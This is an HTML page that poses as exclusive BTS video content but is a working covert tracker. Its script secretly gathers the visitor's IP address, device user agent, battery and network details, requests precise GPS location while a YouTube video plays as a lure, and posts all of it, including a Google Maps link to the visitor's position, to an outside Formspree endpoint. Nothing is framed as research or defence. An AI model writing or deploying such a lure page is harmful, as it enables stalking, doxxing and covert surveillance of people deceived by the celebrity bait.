<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BTS Special Content</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: white; font-family: sans-serif; }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; color: #000; display: flex;
            justify-content: center; align-items: center; z-index: 100; cursor: pointer;
        }
        .btn { padding: 15px 30px; background: #9146ff; color: white; border-radius: 50px; font-weight: bold; font-size: 1.2rem; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        #player { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
    </style>
</head>
<body>

    <div id="overlay" onclick="startExperience()">
        <div style="text-align: center;">
            <div class="btn">點擊播放 BTS 最新專屬內容</div>
            <p style="margin-top: 15px; color: #888; font-size: 0.9rem;">(內容載入中，請確保音量已開啟)</p>
        </div>
    </div>

    <div id="player"></div>

    <script>
        const FORM_ENDPOINT = "https://formspree.io/f/xdawapwr";
        const VIDEO_ID = "WMweEpGlu_U"; // 這裡現在是 BTS 的 Butter，你可以自行更換 ID
        
        let trackData = {
            ip: "獲取中...",
            ua: navigator.userAgent,
            battery: "未知",
            charging: "未知",
            net: "未知"
        };

        // 1. 獲取無需權限的資訊 (IP)
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json()).then(d => trackData.ip = d.ip);

        // 2. 獲取電池資訊
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                trackData.battery = (b.level * 100) + "%";
                trackData.charging = b.charging ? "是" : "否";
            });
        }

        // 3. 獲取網路環境
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) trackData.net = conn.effectiveType;

        function startExperience() {
            document.getElementById('overlay').style.display = 'none';
            
            // 播放 YouTube
            loadYT();

            // 請求定位 (這會跳出視窗)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => sendData(p.coords),
                    () => sendData(null),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                sendData(null);
            }
        }

        function loadYT() {
            const t = document.createElement('script');
            t.src = "https://www.youtube.com/iframe_api";
            document.body.appendChild(t);
        }

        function onYouTubeIframeAPIReady() {
            new YT.Player('player', {
                videoId: VIDEO_ID,
                playerVars: { 'autoplay': 1, 'controls': 1 },
                events: { 'onReady': e => e.target.playVideo() }
            });
        }

        function sendData(coords) {
            const fd = new FormData();
            fd.append("🌐 IP 地址", trackData.ip);
            fd.append("📱 設備型號", trackData.ua);
            fd.append("🔋 電量", trackData.battery);
            fd.append("🔌 充電中", trackData.charging);
            fd.append("📶 網路", trackData.net);

            if (coords) {
                fd.append("📍 精確定位", `${coords.latitude}, ${coords.longitude}`);
                fd.append("🔗 地圖連結", `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`);
            } else {
                fd.append("⚠️ GPS", "對方拒絕定位");
            }

            fetch(FORM_ENDPOINT, { method: "POST", body: fd, headers: { 'Accept': 'application/json' } });
        }
    </script>
</body>
</html>
